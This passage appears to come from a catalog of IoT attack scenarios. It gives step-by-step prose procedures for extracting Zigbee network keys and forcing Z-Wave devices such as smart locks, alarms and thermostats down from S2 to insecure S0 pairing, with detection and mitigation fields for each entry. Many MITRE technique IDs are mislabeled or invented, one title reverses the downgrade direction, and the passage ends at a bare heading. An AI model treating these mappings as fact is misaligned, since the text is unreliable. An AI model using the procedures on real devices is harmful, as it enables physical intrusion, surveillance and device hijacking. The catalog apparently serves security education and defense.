- **Impact**: Long-term network compromise
- **Tools**: ZigDiggity, RZUSBstick, scapy-radio
- **Scenario**: Attacker forces Zigbee devices to rejoin the network and captures the key if sent unencrypted.
- **Attack Steps**: Step 1: Attacker scans for nearby Zigbee devices and notes their addresses. Step 2: Sends a crafted "Rejoin Request" packet to force the end device to leave and rejoin. Step 3: Device attempts to rejoin the network. If insecure join is enabled, the key is resent in plaintext. Step 4: Attacker captures the rejoin traffic using zbdump. Step 5: Extracts the Network Key from the captured frames. Step 6: Uses this key to monitor or spoof device traffic.
- **Detection**: Analyze rejoin events, Log anomalies
- **Solution**: Disable insecure rejoin, enforce key rotation
- **Tags**: zigbee, rejoin, key-capture

## Zigbee OTA Firmware Key Leak

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Coordinator and Endpoint
- **Vulnerability**: Unencrypted OTA Updates
- **MITRE**: T1552.001 (Unprotected Credentials)
- **Impact**: Device spoofing or cloning
- **Tools**: ZBOSS Sniffer, KillerBee, Wireshark
- **Scenario**: Attacker listens to Over-The-Air (OTA) firmware updates and extracts embedded keys.
- **Attack Steps**: Step 1: Attacker uses a Zigbee sniffer to monitor OTA updates on the network. Step 2: Waits for a firmware upgrade event (either automatic or triggered). Step 3: Captures firmware packets being sent to the Zigbee device. Step 4: Analyzes the firmware binary using a hex editor or reverse engineering tool. Step 5: Extracts hardcoded keys or signs of insecure cryptographic material. Step 6: Uses this key to decrypt traffic or impersonate legitimate devices.
- **Detection**: Monitor OTA traffic, checksum mismatch alerts
- **Solution**: Use encrypted firmware updates
- **Tags**: zigbee, ota, firmware, key-extraction

## Extraction via Zigbee Touchlink Commissioning

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Light Bulbs, Smart Plugs
- **Vulnerability**: Insecure Commissioning Mode
- **MITRE**: T1071.001 (Application Layer Protocol)
- **Impact**: Unauthorized network joining and control
- **Tools**: ZigBee Touchlink Sniffer, HackRF, scapy-radio
- **Scenario**: Attacker exploits Touchlink commissioning process to sniff or manipulate key transfer.
- **Attack Steps**: Step 1: Attacker uses a software-defined radio like HackRF and tunes into Zigbee channel 15–20. Step 2: Sends out Touchlink Scan Requests to nearby devices. Step 3: If a device supports Touchlink and is in commissioning mode, it responds with identifying info. Step 4: Attacker forces the commissioning to happen insecurely, capturing the network key exchange. Step 5: The key, sent over-the-air in some legacy or insecure configurations, is extracted from packet logs. Step 6: With the key, the attacker joins the network silently and manipulates devices.
- **Detection**: RF audit logs, monitoring unknown joins
- **Solution**: Disable Touchlink or secure commissioning
- **Tags**: zigbee, touchlink, sdraudio, key-snoop

## Key Extraction via Insecure Trust Center Join

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Coordinator
- **Vulnerability**: Insecure Key Distribution
- **MITRE**: T1071.003 (Application Layer Protocol - Zigbee)
- **Impact**: Total compromise of Zigbee network
- **Tools**: KillerBee, RZUSBstick, Wireshark
- **Scenario**: Attacker targets a Trust Center (Zigbee Coordinator) that accepts devices without authentication and shares the network key insecurely.
- **Attack Steps**: Step 1: Attacker passively sniffs Zigbee traffic in the area using zbdump. Step 2: Attacker identifies the Trust Center (usually the coordinator) that responds to join requests. Step 3: A new device (simulated or real) tries to join the network. Step 4: The Trust Center sends the Zigbee Network Key to the joining device in plaintext or encrypted with a known key. Step 5: The attacker captures this transmission. Step 6: Using zbkeys or Zigbee dissector in Wireshark, they extract the key. Step 7: Attacker can now decode all Zigbee traffic or join the network with full control.
- **Detection**: Monitor joining traffic, trust policy auditing
- **Solution**: Enforce install code or pre-shared key join policy
- **Tags**: zigbee, trust center, network key, sniffing

## Interception via Key Transport During Backup/Restore

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Gateway/Coordinator
- **Vulnerability**: Backup Key Leakage
- **MITRE**: T1552.004 (Unprotected Backup Data)
- **Impact**: Enables eavesdropping, unauthorized joins
- **Tools**: Smart RF Protocol Analyzer, Wireshark, USB sniffer dongle
- **Scenario**: Some Zigbee devices send the network key during a backup or restore operation, especially in commercial gateways.
- **Attack Steps**: Step 1: Attacker monitors traffic during a Zigbee backup or device restore operation. Step 2: Captures frames being exchanged between the gateway and the Zigbee Trust Center. Step 3: Identifies a cluster communication where the backup or rejoin key is transmitted. Step 4: Checks whether the key is encrypted using known Zigbee fallback keys or plaintext. Step 5: Extracts the key using a Zigbee dissector or KillerBee. Step 6: Uses the key to rejoin the Zigbee network or decrypt future packets.
- **Detection**: Traffic analysis during backup periods
- **Solution**: Avoid insecure backup protocols
- **Tags**: zigbee, backup, restore, gateway exploit

## Passive Key Derivation from Install Code

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee End Device
- **Vulnerability**: Install Code Exposure
- **MITRE**: T1200 (Hardware Input Capture)
- **Impact**: Link key leakage, long-term spoofing
- **Tools**: zbid, zbassocflood, Wireshark
- **Scenario**: Attacker guesses or intercepts an install code used to derive the Trust Center link key.
- **Attack Steps**: Step 1: Attacker observes a new device being added using an "Install Code". Step 2: Install Codes are used to derive a link key between the device and Trust Center. Step 3: In some devices, these codes are printed on a label or sent via insecure mobile apps. Step 4: Attacker obtains this code via physical access, shoulder surfing, or leaked image. Step 5: Attacker uses the known install code to generate the Link Key using Zigbee specs. Step 6: With the link key, attacker intercepts traffic between the device and Trust Center.
- **Detection**: Compare install code reuse, audit joins
- **Solution**: Use encrypted, app-only provisioning
- **Tags**: zigbee, install code, link key, passive capture

## Compromising Zigbee Network via Device Cloning

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Device (Smart Plug/Bulb)
- **Vulnerability**: Insecure Key Storage
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Hardware clone of trusted node
- **Tools**: Bus Pirate, JTAGulator, OpenOCD, FlashROM
- **Scenario**: Attacker clones a Zigbee device’s memory where keys are stored, gaining access to the network.
- **Attack Steps**: Step 1: Attacker physically obtains a Zigbee device (e.g., smart plug). Step 2: Opens the casing and accesses debug ports (JTAG, UART, SPI). Step 3: Connects to the chip using Bus Pirate or JTAGulator. Step 4: Dumps flash memory using FlashROM or similar tools. Step 5: Parses the dump to locate network keys (often in plaintext). Step 6: Uses extracted keys to clone or emulate the original device, gaining access to the network.
- **Detection**: Debug port scan, behavioral anomaly
- **Solution**: Disable debug interfaces, encrypt storage
- **Tags**: zigbee, jtag, memory dump, cloning

## Zigbee Key Extraction via Replay and Decryption

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Bulbs, Outlets
- **Vulnerability**: Replayable Encrypted Frames
- **MITRE**: T1110.003 (Brute Force – Application Protocol)
- **Impact**: Key discovery, forged commands
- **Tools**: ZigBee Replayer (custom), Wireshark, scapy-radio
- **Scenario**: Attacker replays encrypted traffic from a known scenario and brute-forces keys using predictable patterns.
- **Attack Steps**: Step 1: Attacker captures encrypted command sequences (e.g., turning a smart bulb on/off). Step 2: Stores the exact encrypted frames. Step 3: Replays the same frame to observe if the device responds. Step 4: If it does, attacker uses statistical analysis to narrow down key candidates. Step 5: Brute-forces likely keys (especially if key entropy is low or uses a fixed seed). Step 6: Once the network key is guessed, attacker can decrypt and forge commands.
- **Detection**: Detect identical frame sequences
- **Solution**: Use nonce or frame counter validation
- **Tags**: zigbee, replay, brute-force, encrypted packet

## Sniffing Commissioning Key via Green Power Device Join

- **Attack Type**: Zigbee Key Extraction
- **Target**: Green Power Zigbee Devices
- **Vulnerability**: Unsecured Commissioning
- **MITRE**: T1557.002 (Impersonation – Zigbee GP)
- **Impact**: Remote spoofing of GP commands
- **Tools**: Ubiqua Protocol Analyzer, HackRF, KillerBee
- **Scenario**: Green Power (GP) Zigbee devices send a commissioning key during setup that can be intercepted.
- **Attack Steps**: Step 1: Attacker waits for a Green Power device to join the Zigbee network. Step 2: Captures commissioning frames using zbdump or Ubiqua. Step 3: If security level is low (common in legacy devices), commissioning key is sent unencrypted. Step 4: Extracts the key from the payload using Zigbee specs. Step 5: Uses it to impersonate the GP device or inject spoofed energy-saving data.
- **Detection**: Monitor GP join traffic, restrict GP usage
- **Solution**: Enforce encrypted commissioning
- **Tags**: zigbee, green power, commissioning, impersonation

## Extraction Using Association Flood & Join Capture

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Coordinator
- **Vulnerability**: Association Handling Abuse
- **MITRE**: T1499.004 (DoS via Flood) + T1040
- **Impact**: Key leak through join under duress
- **Tools**: zbassocflood, KillerBee, scapy-radio
- **Scenario**: Attacker floods the network with association requests to force key exchange, which is sniffed.
- **Attack Steps**: Step 1: Attacker launches zbassocflood tool targeting the Zigbee PAN ID. Step 2: Floods the coordinator with bogus join requests. Step 3: Eventually a real device joins the network. Step 4: During this legitimate join, attacker is already capturing traffic. Step 5: Captures the key sent (if encryption not enforced). Step 6: Uses it to sniff or spoof Zigbee communication.
- **Detection**: Detect join flood, throttle joins
- **Solution**: Rate-limit join requests, whitelist devices
- **Tags**: zigbee, flood, join, key capture

## Exploiting Zigbee NWK Update Broadcasts

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Coordinator
- **Vulnerability**: Broadcasted Key Updates
- **MITRE**: T1027.002 (Obfuscated Files or Info – Network)
- **Impact**: Persistent access via update leak
- **Tools**: ZBOSS Sniffer, Ubiqua, zbdump
- **Scenario**: Some coordinators send network updates containing keys over broadcast.
- **Attack Steps**: Step 1: Attacker listens for network update commands sent by coordinator. Step 2: Captures Mgmt_NWK_Update_notify or similar cluster packets. Step 3: Analyzes the payload for embedded key material (some older firmwares broadcast them). Step 4: Extracts and stores the new network key. Step 5: Rejoins the network using the extracted key. Step 6: Begins monitoring or interfering with communication.
- **Detection**: Analyze broadcast logs
- **Solution**: Disable insecure updates; encrypt key rotation
- **Tags**: zigbee, update, key broadcast, sniff

## Physical Extraction via Side-Channel Timing Attack

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee SoC Device
- **Vulnerability**: Side-channel Timing
- **MITRE**: T1201 (Hardware Side Channel)
- **Impact**: Key theft without firmware access
- **Tools**: ChipWhisperer, Oscilloscope, Power Analyzer
- **Scenario**: Attacker uses timing differences in responses to infer key bits over time.
- **Attack Steps**: Step 1: Attacker connects Zigbee device to power analysis hardware. Step 2: Sends multiple requests while recording power/timing profiles. Step 3: Analyzes timing or power consumption differences using statistical analysis. Step 4: Derives bits of the cryptographic key using DPA (Differential Power Analysis). Step 5: Reconstructs the full key and applies it to a Zigbee sniffer. Step 6: Uses it to monitor or spoof Zigbee traffic.
- **Detection**: RF timing drift, hardware audit
- **Solution**: Harden SoC, implement side-channel resistance
- **Tags**: zigbee, side-channel, dpa, timing attack

## Exploiting Manufacturer Debug Firmware

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Device (Vendor Firmware)
- **Vulnerability**: Debug Info in Production
- **MITRE**: T1592.002 (Firmware)
- **Impact**: Remote join or firmware spoof
- **Tools**: Firmware RE tools, Binwalk, JTAG, Bus Pirate
- **Scenario**: Manufacturer-supplied firmware in debug mode leaks keys or supports full memory read.
- **Attack Steps**: Step 1: Attacker downloads device firmware from vendor or extracts it from device. Step 2: Uses Binwalk to analyze firmware image. Step 3: Finds debug build flags or memory-mapped crypto keys. Step 4: Emulates firmware in QEMU or extracts file system. Step 5: Reads stored network or install keys. Step 6: Uses keys in Zigbee sniffer or re-join attempt.
- **Detection**: Firmware signature validation
- **Solution**: Ship release-only firmware
- **Tags**: zigbee, firmware, binwalk, memory leak

## Zigbee Key Recovery via Leaked Mobile App Config

- **Attack Type**: Zigbee Key Extraction
- **Target**: Mobile-Controlled Zigbee Devices
- **Vulnerability**: Insecure App Configuration
- **MITRE**: T1552.001 (Unprotected Credentials in Software)
- **Impact**: Attacker can join network, decrypt traffic, or control Zigbee devices
- **Tools**: APKTool, Burp Suite, Wireshark
- **Scenario**: Some smart home mobile apps used for pairing Zigbee devices embed static keys or retrieve them insecurely via API endpoints.
- **Attack Steps**: Step 1: Attacker downloads the official Android/iOS app of a Zigbee device (e.g., smart light).Step 2: Uses APKTool or jadx to reverse-engineer the mobile app and look at its source code/config.Step 3: Identifies hardcoded Zigbee install codes, shared secrets, or default network keys.Step 4: Alternatively, uses Burp Suite to proxy the app during device setup and watches the key exchange with backend/cloud.Step 5: Extracts the key (often base64-encoded) from either the code or captured HTTP requests.Step 6: Uses this network key in Wireshark or KillerBee to decrypt traffic and impersonate the device.
- **Detection**: Mobile app code scanning; traffic proxy logs
- **Solution**: Avoid hardcoded keys, use encrypted app-backend communication
- **Tags**: zigbee, mobile, apktool, app reverse

## Key Recovery from Leaked Zigbee UIDs in Logs

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Home Hubs / Open Systems
- **Vulnerability**: Log File Leakage
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Total compromise of Zigbee traffic & device identity
- **Tools**: SSH, Log Parser, syslog, grep
- **Scenario**: Some misconfigured home automation systems log device UIDs and join keys in plaintext in system logs or debug outputs.
- **Attack Steps**: Step 1: Attacker gains access to the Zigbee controller (e.g., Home Assistant, OpenHAB) via SSH or physical access.Step 2: Searches logs under /var/log or app-specific paths for join events using grep -i 'join'.Step 3: Finds logs that contain the 64-bit IEEE UID and network key of Zigbee end devices during pairing.Step 4: Copies the network key and enters it into Wireshark Zigbee Preferences.Step 5: Starts sniffing Zigbee traffic and can now decrypt all packets in the mesh network.Step 6: Optionally reuses the UID and key to emulate the real device using a programmable Zigbee dongle.
- **Detection**: Log audits; permission monitoring
- **Solution**: Avoid logging sensitive fields; enforce redaction
- **Tags**: zigbee, logs, key-leak, join-info

## Exploiting Over-the-Air Group Key Distribution

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Grouped Devices
- **Vulnerability**: Insecure Group Key Broadcast
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Unauthorized control of grouped Zigbee devices
- **Tools**: Ubiqua Protocol Analyzer, KillerBee, Wireshark
- **Scenario**: When Zigbee groups are created (e.g., for lighting), a shared group key is sent OTA, which attackers can intercept.
- **Attack Steps**: Step 1: Attacker passively monitors Zigbee channels 11–26 for broadcast packets.Step 2: During group formation (e.g., multiple lights being synced), a group key is distributed.Step 3: If the key is sent without link-layer encryption or uses a known install key, it can be captured in plaintext.Step 4: Attacker captures this group key using Ubiqua or zbdump.Step 5: The attacker now has access to commands sent to that group of devices (e.g., all lights ON/OFF).Step 6: They replay or forge packets to control the group or cause network confusion.
- **Detection**: Monitor for unauthorized group commands
- **Solution**: Encrypt group keys using link key; disable group auto-join
- **Tags**: zigbee, group, ota, broadcast, key

## Zigbee Key Extraction from EEPROM Dump

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Sensors / Switches
- **Vulnerability**: Unencrypted Key Storage in EEPROM
- **MITRE**: T1055 (Process Injection – Physical Variant)
- **Impact**: Full control of network from compromised endpoint
- **Tools**: EEPROM reader (CH341A), FlashROM, Hex Editor
- **Scenario**: Physical access to device's EEPROM can allow an attacker to dump the stored network key if it’s unencrypted.
- **Attack Steps**: Step 1: Attacker removes the Zigbee device’s case and identifies EEPROM chip (e.g., 24C32).Step 2: Connects EEPROM chip to a USB reader like CH341A with clip.Step 3: Uses FlashROM or vendor software to read the chip contents.Step 4: Opens the binary dump in a hex editor.Step 5: Searches for known byte sequences (e.g., key length = 16 bytes, entropy signature) to locate the network key.Step 6: Uses the key in Wireshark or joins the network via programmable Zigbee interface.Bonus: Key is often in little endian or base64 format, requiring conversion.
- **Detection**: EEPROM checksum mismatch, physical tamper alerts
- **Solution**: Encrypt EEPROM storage; use key diversification
- **Tags**: zigbee, eeprom, dump, hex

## Zigbee Install Code Extraction via NFC/QR Code Scan

- **Attack Type**: Zigbee Key Extraction
- **Target**: Zigbee Smart Thermostats, Plugs
- **Vulnerability**: Exposed Install Code on Physical Device
- **MITRE**: T1595.002 (Compromise via Physical Recon)
- **Impact**: Attacker joins network without triggering alerts
- **Tools**: Phone Camera, NFC Scanner, Install Code Decoder
- **Scenario**: Some Zigbee install codes are stored in QR or NFC tags on the devices and can be photographed/scanned by an attacker nearby.
- **Attack Steps**: Step 1: Attacker gains short-term physical proximity to Zigbee device (e.g., thermostat in hotel room).Step 2: Uses phone camera to photograph the QR code label or scans the NFC tag.Step 3: Decodes the QR/NFC to retrieve the Install Code (usually 128-bit key).Step 4: Uses this code in Zigbee commissioning tools to derive the link key using Zigbee specs.Step 5: Uses this key to sniff future join sessions or impersonate that device during rejoin.Step 6: Installs a rogue device that joins the network using the same link key, enabling network access or spoofing.
- **Detection**: QR scan audit logs, NFC interaction logs
- **Solution**: Use temporary pairing codes; avoid printed keys
- **Tags**: zigbee, qr, install code, physical access

## Z-Wave S0 Downgrade to S2 for Key Theft

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Smart Lock
- **Vulnerability**: Weak fallback to insecure protocol (S0)
- **MITRE**: T1040: Network Sniffing
- **Impact**: Full device compromise; key theft
- **Tools**: Z-Wave Sniffer (like UZB stick), PC Controller (Silicon Labs), Wireshark
- **Scenario**: A smart lock that supports S2 encryption is forced into using the older, weaker S0 encryption so the attacker can steal the network keys during pairing.
- **Attack Steps**: Step 1: Plug in Z-Wave sniffer (UZB stick) to laptop and open Wireshark. Step 2: Wait for target smart lock to be unpaired or reset by owner. Step 3: Start capturing Z-Wave traffic. Step 4: During the pairing process, actively inject malformed or out-of-order frames to cause the controller to downgrade from S2 to S0. Step 5: Capture the S0 network key sent in plain text. Step 6: Replay or reuse the key to impersonate controller or lock later.
- **Detection**: Monitor unexpected S0 key usage; alert on unexpected pairing sequences
- **Solution**: Enforce only S2 pairing; monitor for downgrade attempts
- **Tags**: downgrade, z-wave, key theft, sniffing, S0, S2

## Smart Plug Hijack via Legacy Pairing Mode

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Smart Plug
- **Vulnerability**: Protocol fallback; cleartext key during S0
- **MITRE**: T1110: Brute Force (adapted for IoT pairing downgrade)
- **Impact**: Attacker can control devices remotely
- **Tools**: Z-Wave Toolbox, UZB Sniffer, PC Controller
- **Scenario**: A smart plug is forced into legacy S0 pairing mode through reset and tricked into exposing keys.
- **Attack Steps**: Step 1: Physically access the smart plug and factory reset it. Step 2: Start Z-Wave sniffer to listen for re-pairing. Step 3: Simulate controller using PC Controller tool. Step 4: When the device tries to negotiate S2, send an unsupported S2 command to force fallback. Step 5: Device falls back to S0 and sends key in clear. Step 6: Record key and use it to send ON/OFF commands anytime.
- **Detection**: Look for rapid device resets and pairing events
- **Solution**: Limit device to known secure controllers; disallow S0
- **Tags**: z-wave, hijack, plug, iot, downgrade

## Z-Wave Hub Poisoning through Re-Pair Attack

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Z-Wave Hub
- **Vulnerability**: Repeated S0 downgrade exploits
- **MITRE**: T1557.001: Adversary-in-the-Middle (Z-Wave specific)
- **Impact**: Total network takeover
- **Tools**: PC Controller, USB Z-Wave Stick, Wireshark
- **Scenario**: An attacker repeatedly unpairs and re-pairs with a Z-Wave hub, each time forcing it to S0, eventually gaining control over all connected devices.
- **Attack Steps**: Step 1: Use physical access or jamming to force a reset of the Z-Wave hub. Step 2: Start Wireshark and monitor all Z-Wave frames. Step 3: Begin spoofed pairing request using PC Controller with S0 mode only. Step 4: When hub accepts, note the exposed key in the pairing logs. Step 5: Use this key to intercept traffic and replay ON/OFF or sensor commands. Step 6: Repeat for all connected devices to slowly compromise the network.
- **Detection**: Monitor repeated pairing requests; alert on S0 downgrade
- **Solution**: Enforce pairing validation with fingerprints
- **Tags**: poison, z-wave hub, downgrade, replay, attack

## Smart Thermostat Downgrade for Environment Control

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Smart Thermostat
- **Vulnerability**: S0 fallback due to poor enforcement
- **MITRE**: T1496: Resource Hijacking (environmental systems)
- **Impact**: Disruption of environmental control
- **Tools**: Z-Wave Controller, Sniffer Stick, Laptop
- **Scenario**: Attacker forces thermostat to fallback to insecure pairing to control HVAC remotely and disrupt environment settings.
- **Attack Steps**: Step 1: Reset smart thermostat (physical or social engineering). Step 2: Initiate pairing from rogue controller. Step 3: Refuse S2 commands and only respond with S0. Step 4: Thermostat falls back to S0 and sends key in the clear. Step 5: Capture key and send temperature control commands from rogue controller. Step 6: Set extreme temperatures or shut down HVAC remotely.
- **Detection**: Alert on remote commands from unauthorized controller
- **Solution**: Use certified devices that reject S0-only pairing
- **Tags**: thermostat, hvac, z-wave, downgrade

## Sensor Injection via Downgraded Pairing

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Motion Sensor
- **Vulnerability**: Lack of authentication in S0 mode
- **MITRE**: T1200: Hardware Additions (using rogue controller)
- **Impact**: Physical intrusion or false alarm generation
- **Tools**: PC Controller Tool, Z-Wave Sniffer, SDR optionally
- **Scenario**: A motion sensor is compromised using downgrade attacks and injected with false presence data to trigger alarms or disable systems.
- **Attack Steps**: Step 1: Locate target motion sensor and factory reset it. Step 2: Begin pairing it to a rogue controller using only S0 mode. Step 3: Device falls back to S0 and key is exposed. Step 4: Use captured key to send fake motion detected messages to hub. Step 5: Use false triggers to cause security alerts or distract physical security.
- **Detection**: Alert on excessive triggers or pairing history
- **Solution**: Use devices with S2-only policies; monitor sensor logic
- **Tags**: sensor, presence, z-wave, downgrade, spoof

## Remote Z-Wave Lock Compromise via S0 Replay

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Smart Lock
- **Vulnerability**: Replay attack due to lack of nonce validation in S0
- **MITRE**: T1557: Man-in-the-Middle
- **Impact**: Physical security breach
- **Tools**: UZB Sniffer, Wireshark, Python for replay
- **Scenario**: An attacker sniffs a Z-Wave lock's S0 traffic and replays it to unlock a door remotely.
- **Attack Steps**: Step 1: Use a Z-Wave sniffer like UZB stick with Wireshark to monitor traffic between Z-Wave lock and controller.Step 2: Wait for a legitimate unlock command sent using S0.Step 3: Identify the payload and capture the frame.Step 4: Write a simple Python script or use replay tool to resend the same frame to the lock.Step 5: Lock interprets it as a valid unlock command since S0 lacks proper authentication of origin.Step 6: Gain access to physical location or demonstrate in a lab simulation.
- **Detection**: Detect repeated or replayed command IDs
- **Solution**: Upgrade to S2-only locking systems
- **Tags**: z-wave, lock, replay, downgrade

## Z-Wave Lighting Control Override with S0 Downgrade

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Smart Light Switch
- **Vulnerability**: Weak key exchange fallback to S0
- **MITRE**: T1548.002: Abuse Elevation Control Mechanism
- **Impact**: Unauthorized control of home systems
- **Tools**: Sniffer, PC Controller, Lighting Z-Wave Device
- **Scenario**: Lights in a home automation system are forced into S0 communication to allow override via replay attacks.
- **Attack Steps**: Step 1: Reset the Z-Wave light bulb or control switch.Step 2: Use PC Controller to initiate a pairing, responding only with S0 capabilities.Step 3: Device accepts downgrade and sends network key in plain.Step 4: Sniff and save key using Wireshark.Step 5: Issue ON/OFF commands using the PC Controller software with the stolen key.Step 6: Demonstrate attacker control over lights without user knowledge.
- **Detection**: Unusual timing or sequence of ON/OFF signals
- **Solution**: Enforce S2 authentication and prevent fallback
- **Tags**: lighting, z-wave, home, s0, exploit

## Attacker Disrupts Z-Wave Network with Flooded Pairing Requests

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Z-Wave Hub
- **Vulnerability**: No rate limiting or request validation
- **MITRE**: T1499.001: Resource Exhaustion
- **Impact**: Denial of service on hub
- **Tools**: Z-Wave Controller Emulator, Traffic Generator
- **Scenario**: Attacker overwhelms controller with fake pairing requests in S0 mode, leading to network instability.
- **Attack Steps**: Step 1: Setup a rogue Z-Wave controller emulator (e.g., using PC Controller).Step 2: Write a script or use tool to continuously broadcast pairing requests using only S0.Step 3: Monitor the legitimate controller’s logs to observe pairing queue fill up.Step 4: Observe high CPU or dropped connections on Z-Wave hub.Step 5: Devices become unresponsive or controller may reboot.Step 6: Optional: try pairing during chaos to silently insert rogue device.
- **Detection**: Alert on excess pairing attempts
- **Solution**: Add flood detection; block devices with bad pairing behavior
- **Tags**: z-wave, flood, pairing, s0, dos

## Z-Wave Water Sensor Falsified via Downgraded Key

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Water Leak Sensor
- **Vulnerability**: Insecure S0 control command transmission
- **MITRE**: T1565.002: Device Spoofing
- **Impact**: Trigger false water shutoff, panic alerts
- **Tools**: Z-Wave Sniffer, PC Controller, Leak Sensor
- **Scenario**: An attacker spoofs water leak signals using S0 keys to trigger alarms or shutoff valves unnecessarily.
- **Attack Steps**: Step 1: Reset the water sensor and re-pair it with attacker’s S0 controller.Step 2: During S0 pairing, capture network key in plaintext.Step 3: Use this key to simulate a leak signal (basic command class SET).Step 4: Send fake leak commands to water shutoff system or central hub.Step 5: Confirm actuation by observing shutoff or alert.Step 6: Replay in controlled lab to simulate environmental sabotage.
- **Detection**: Check sensor MAC consistency; alert on rogue sends
- **Solution**: Use authenticated command class or S2
- **Tags**: spoof, water, z-wave, downgrade

## Door Sensor Spoof via Downgrade Attack

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Door Sensor
- **Vulnerability**: S0 command spoofing
- **MITRE**: T1200: Hardware Additions
- **Impact**: False alarm or bypass of intrusion detection
- **Tools**: Z-Wave Toolbox, PC Controller, SDR (optional)
- **Scenario**: Attacker forces door sensor into S0 pairing, captures key, and spoofs open/closed signals to trick alarm systems.
- **Attack Steps**: Step 1: Identify door sensor and factory reset.Step 2: Pair it with attacker-controlled S0-only controller.Step 3: Capture key in pairing.Step 4: Use PC Controller to simulate a ‘door open’ command.Step 5: Repeat with ‘closed’ signals to show flip.Step 6: Integrate with alarm system to test spoofed triggering.
- **Detection**: Behavior-based door status analytics
- **Solution**: Enforce S2 and tamper-proof devices
- **Tags**: door, sensor, spoofing, z-wave

## Multi-Device Compromise via S0 Controller Takeover

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Z-Wave IoT Lab
- **Vulnerability**: S0 fallback at scale across many devices
- **MITRE**: T1087.001: Account Hijacking (Z-Wave net control)
- **Impact**: Takeover of entire device network
- **Tools**: PC Controller Tool, USB Z-Wave Stick
- **Scenario**: A compromised Z-Wave controller, configured to accept only S0, is used to re-pair and hijack all devices in a lab network.
- **Attack Steps**: Step 1: Configure PC Controller to emulate a master controller using S0 only.Step 2: One by one, unpair devices from their legitimate hub.Step 3: Immediately start pairing to rogue controller.Step 4: All devices use S0 due to fallback.Step 5: Log each key during pairing.Step 6: Gain full command-and-control over the network from rogue controller.
- **Detection**: Detect device ownership changes
- **Solution**: Require device whitelisting and S2 exclusive
- **Tags**: controller, z-wave, mass hijack

## Covert Surveillance via Motion Sensor Hijack

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: PIR Motion Sensor
- **Vulnerability**: S0 allows silent takeover & data monitoring
- **MITRE**: T1056: Input Capture (adapted for motion)
- **Impact**: Privacy breach; activity profiling
- **Tools**: Z-Wave Sniffer, Controller Software
- **Scenario**: Attacker uses S0 downgrade to take control of motion sensor and log human activity covertly.
- **Attack Steps**: Step 1: Reset motion sensor manually.Step 2: Pair to attacker’s S0-only controller.Step 3: Capture pairing session and save key.Step 4: Monitor traffic using key to log timestamps of all motion alerts.Step 5: Correlate data with expected occupancy.Step 6: Generate pattern of victim behavior or simulate in lab with movement.
- **Detection**: Log unusual pairings or metadata access
- **Solution**: Sensor event encryption + alerting
- **Tags**: z-wave, sensor, spy, downgrade

## Air Quality Sensor Manipulation Using Downgrade

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Air Quality Monitor
- **Vulnerability**: No integrity check on sensor data
- **MITRE**: T1565.001: Data Manipulation
- **Impact**: False automation or panic alerts
- **Tools**: Z-Wave Controller, Sniffer, Sensor Device
- **Scenario**: Attacker alters AQI values using S0 access to manipulate air filters or alarms.
- **Attack Steps**: Step 1: Reset air quality monitor.Step 2: Initiate pairing with only S0 options enabled.Step 3: Sensor downgrades and shares key.Step 4: Send fabricated AQI values (e.g., high CO2).Step 5: Observe if air filters turn on or alarms activate.Step 6: Use logs to educate students on sensor spoofing impact.
- **Detection**: Compare with external reference data
- **Solution**: Ensure secure transmission of sensor values
- **Tags**: air quality, spoof, z-wave

## Secure Pairing Override with S0 Injection

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Any S2 Capable Z-Wave Device
- **Vulnerability**: Misuse of protocol negotiation
- **MITRE**: T1631: Downgrade Attack
- **Impact**: Weak encryption used; command abuse
- **Tools**: Z-Wave Sniffer, Injection Tool
- **Scenario**: During S2 pairing, an attacker injects timing-based S0 messages to cause fallback.
- **Attack Steps**: Step 1: Monitor pairing process of secure device with sniffer.Step 2: At exact moment of S2 challenge, inject spoofed “unsupported” error.Step 3: Controller believes device doesn’t support S2.Step 4: Automatically switches to S0.Step 5: Key is exchanged in clear.Step 6: Use key to issue commands and log all communication.Step 7: Repeat with multiple devices for educational replay.
- **Detection**: Alert on unsupported negotiation flags
- **Solution**: Time-bound S2 pairing; retry S2 upon fallback
- **Tags**: pairing, injection, z-wave

## Heating Control Exploit via Downgrade

- **Attack Type**: Z-Wave Downgrade Attack
- **Target**: Smart Heating Valve
- **Vulnerability**: Lack of control authorization in S0
- **MITRE**: T1496: Resource Hijacking
- **Impact**: Cold environments or heating failures
- **Tools**: PC Controller, Smart Radiator Valve
- **Scenario**: A heating actuator is manipulated via S0 to disable home heating system.
- **Attack Steps**: Step 1: Reset radiator valve (manually or by power cycling).Step 2: Initiate pairing using PC Controller configured for S0.Step 3: Capture key and store.Step 4: Send ‘temperature = 10°C’ command repeatedly.Step 5: Monitor heating system reacts and disables heating.Step 6: Demonstrate heating outage or simulate HVAC impact in lab.
- **Detection**: Compare HVAC control logs with temp logs
- **Solution**: Use encrypted channels for critical systems
- **Tags**: heating, hvac, z-wave, spoof

## Downgrade Attack on Z-Wave Alarm System

